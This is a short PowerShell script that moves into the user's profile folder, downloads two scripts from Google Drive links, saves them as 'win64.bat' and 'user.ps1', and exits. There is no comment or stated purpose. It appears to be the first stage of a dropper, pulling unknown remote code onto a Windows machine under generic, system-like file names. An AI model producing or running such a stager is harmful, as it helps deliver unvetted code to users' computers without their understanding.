cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=15A4osm79MjhBB3FwV35ej0Mh13q_1OxI" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1UGu_G3KF6VvaICIqVJPOBCioIgM9eYTE" -outfile "user.ps1"
exit
